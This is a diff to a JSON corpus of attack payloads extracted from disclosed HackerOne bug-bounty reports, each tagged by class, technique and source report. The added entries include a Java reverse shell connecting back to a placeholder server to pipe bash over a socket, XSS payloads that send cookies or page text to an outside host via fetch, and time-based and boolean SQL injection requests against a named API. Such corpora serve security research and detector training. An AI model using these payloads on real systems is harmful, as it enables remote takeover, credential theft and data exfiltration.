@@ -24718,6 +24718,23 @@
     }
   },
   {
+    "id": "39c09d95",
+    "class": "rce",
+    "payload": "String host=\"your_server_ip\";\nint port=1337;\nString cmd=\"bash\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exi",
+    "technique": "Java reverse shell using ProcessBuilder to connect back to attacker",
+    "param": null,
+    "report": {
+      "id": 2083771,
+      "url": "https://hackerone.com/reports/2083771",
+      "title": " Remote Code Execution and AWS IAM Credentials Exfiltration in https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/",
+      "program": "U.S. Dept Of Defense",
+      "reporter": "shuvam321",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2024-12-18"
+    }
+  },
+  {
     "id": "15dd2fdb",
     "class": "xss",
     "payload": "\"<iframe/onload=eval(atob(location.hash.substring(1)))>\"@calc.sh",
@@ -27166,6 +27183,193 @@
     }
   },
   {
+    "id": "07a7df4f",
+    "class": "xss",
+    "payload": "<img onerror>",
+    "technique": "Injection of an <img onerror> tag to trigger XSS",
+    "param": null,
+    "report": {
+      "id": 3729501,
+      "url": "https://hackerone.com/reports/3729501",
+      "title": "Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi (reCAPTCHA bypass + no rate limit)",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-27"
+    }
+  },
+  {
+    "id": "33f62574",
+    "class": "xss",
+    "payload": "\"<script>alert(1)</script>\"@a.com",
+    "technique": "Email address containing a <script> tag to achieve XSS",
+    "param": null,
+    "report": {
+      "id": 3729501,
+      "url": "https://hackerone.com/reports/3729501",
+      "title": "Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi (reCAPTCHA bypass + no rate limit)",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-27"
+    }
+  },
+  {
+    "id": "568f11b3",
+    "class": "xss",
+    "payload": "fetch('https://target.com/?c='+document.cookie)",
+    "technique": "JavaScript payload that exfiltrates cookies via fetch to attacker domain",
+    "param": null,
+    "report": {
+      "id": 3729501,
+      "url": "https://hackerone.com/reports/3729501",
+      "title": "Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi (reCAPTCHA bypass + no rate limit)",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-27"
+    }
+  },
+  {
+    "id": "23a62f0a",
+    "class": "xss",
+    "payload": "app.alert(1)",
+    "technique": "PDF JavaScript payload 'app.alert(1)' used for XSS",
+    "param": null,
+    "report": {
+      "id": 3729501,
+      "url": "https://hackerone.com/reports/3729501",
+      "title": "Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi (reCAPTCHA bypass + no rate limit)",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-27"
+    }
+  },
+  {
+    "id": "9b4428c4",
+    "class": "sqli",
+    "payload": "GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D1--",
+    "technique": "Boolean-based SQL injection using a tautology (OR 1=1) to retrieve all rows",
+    "param": "searchText",
+    "report": {
+      "id": 3778282,
+      "url": "https://hackerone.com/reports/3778282",
+      "title": "Critical SQL Injection WDM API (\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588)",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-27"
+    }
+  },
+  {
+    "id": "94a7fad5",
+    "class": "sqli",
+    "payload": "GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2--",
+    "technique": "Boolean-based SQL injection using a false condition (OR 1=2) to confirm the injection point",
+    "param": "searchText",
+    "report": {
+      "id": 3778282,
+      "url": "https://hackerone.com/reports/3778282",
+      "title": "Critical SQL Injection WDM API (\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588)",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-27"
+    }
+  },
+  {
+    "id": "5341a7e0",
+    "class": "sqli",
+    "payload": "GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2%20OR%20(SELECT%20COUNT(*)%20FROM%20sys.tables)%3E0--",
+    "technique": "Boolean-based SQL injection with a subquery (SELECT COUNT(*) FROM sys.tables) to fingerprint the database",
+    "param": "searchText",
+    "report": {
+      "id": 3778282,
+      "url": "https://hackerone.com/reports/3778282",
+      "title": "Critical SQL Injection WDM API (\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588)",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-27"
+    }
+  },
+  {
+    "id": "70fc978f",
+    "class": "sqli",
+    "payload": "GET /api/WDMProduct?searchText=zzz%27);WAITFOR%20DELAY%20%270:0:6%27--",
+    "technique": "Time-based blind SQL injection using WAITFOR DELAY via a stacked query",
+    "param": "searchText",
+    "report": {
+      "id": 3778282,
+      "url": "https://hackerone.com/reports/3778282",
+      "title": "Critical SQL Injection WDM API (\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588)",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-27"
+    }
+  },
+  {
+    "id": "500088e7",
+    "class": "sqli",
+    "payload": "searchText=zzz') OR 1=1--",
+    "technique": "Boolean-based SQL injection using a tautology (OR 1=1) to dump data",
+    "param": "searchText",
+    "report": {
+      "id": 3778282,
+      "url": "https://hackerone.com/reports/3778282",
+      "title": "Critical SQL Injection WDM API (\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588)",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-27"
+    }
+  },
+  {
+    "id": "b51dc9d0",
+    "class": "sqli",
+    "payload": "searchText=zzz');WAITFOR DELAY '0:0:6'--",
+    "technique": "Time-based blind SQL injection using WAITFOR DELAY to cause a delay",
+    "param": "searchText",
+    "report": {
+      "id": 3778282,
+      "url": "https://hackerone.com/reports/3778282",
+      "title": "Critical SQL Injection WDM API (\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588)",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-27"
+    }
+  },
+  {
+    "id": "1b7b3011",
+    "class": "sqli",
+    "payload": "OR 1=1",
+    "technique": "Boolean-based SQL injection fragment that appends OR 1=1 to bypass conditions",
+    "param": null,
+    "report": {
+      "id": 3778282,
+      "url": "https://hackerone.com/reports/3778282",
+      "title": "Critical SQL Injection WDM API (\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588)",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-08-27"
+    }
+  },
+  {
     "id": "459e8e30",
     "class": "xss",
     "payload": "curl -X POST http://TARGET:3000/api/v1/livechat/message \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"token\":\"poc-token-001\",\n    \"rid\":\"ROOM_ID\",\n    \"msg\":\"<img src=x onerror=\\\"fetch(\\\\\\\"https://target.com/exfil?d=\\\\\\\"+btoa(document.body.innerText))\\\">\"\n  }'",
@@ -27238,23 +27442,6 @@
     "class": "xss",
     "payload": "<img src=x onerror=\"location='https://target.com/drive-by-download'\">",
     "technique": "HTML <img> tag with onerror attribute executing a JavaScript redirect (DOM\u2011based XSS)",
-    "param": null,
-    "report": {
-      "id": 3779690,
-      "url": "https://hackerone.com/reports/3779690",
-      "title": "Stored XSS in Rocket.Chat HTML File Export \u2014 Unauthenticated Entry via LiveChat",
-      "program": "Rocket.Chat",
-      "reporter": "olidayw",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2026-07-16"
-    }
-  },
-  {
-    "id": "07a7df4f",
-    "class": "xss",
-    "payload": "<img onerror>",
-    "technique": "HTML <img> tag with onerror attribute (no src) that runs JavaScript to exfiltrate data via fetch (DOM\u2011based XSS)",
     "param": null,
     "report": {
       "id": 3779690,
